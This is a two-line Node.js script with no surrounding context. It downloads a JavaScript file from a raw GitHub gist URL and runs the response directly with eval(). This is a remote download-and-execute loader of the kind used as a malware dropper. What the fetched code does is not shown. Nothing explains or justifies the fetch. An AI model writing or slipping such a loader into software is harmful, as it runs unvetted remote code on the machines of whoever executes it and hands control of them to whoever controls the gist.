const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/121c06680064dba0eca7d09c71acad929cbc143a/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
